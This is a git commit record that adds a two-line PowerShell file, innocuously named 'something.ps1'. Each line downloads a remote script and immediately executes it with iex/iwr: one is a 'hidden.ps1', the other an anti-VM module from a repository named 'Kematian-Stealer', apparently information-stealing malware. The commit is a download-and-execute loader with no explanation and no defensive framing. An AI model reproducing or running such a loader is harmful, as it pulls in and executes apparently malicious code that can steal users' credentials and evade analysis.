db1be5db78dfa3260474bb223636efce418aa4b8
43a1723 <hai1723notgay@gmail.com>
2024-06-10 15:33:14 +0700

    Create something.ps1

---
+++ Extras/something.ps1
@@ -0,0 +1,2 @@
+iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/hidden.ps1" -useb)
+iex (iwr -uri "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/antivm.ps1" -useb)
